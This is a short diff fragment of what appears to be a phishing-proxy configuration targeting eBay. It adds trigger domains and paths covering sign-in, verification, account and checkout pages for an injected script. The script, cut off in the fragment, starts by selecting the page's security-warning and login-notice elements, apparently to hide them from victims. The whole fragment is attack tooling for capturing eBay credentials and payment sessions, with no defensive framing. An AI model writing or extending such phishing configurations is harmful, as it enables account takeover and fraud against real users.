@@ -236,6 +236,8 @@ rules:
         action: redirect
         redirect_to: https://www.ebay.com/signin
 js_inject:
+- trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com", "auth.ebay.com"]
+  trigger_paths: ["/signin", "/signin?signInAction=login", "/myb/SignIn", "/verify", "/my", "/myb/Account", "/pay", "/pay/checkout", "/logout"]
   script: >
     (function() {
         const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
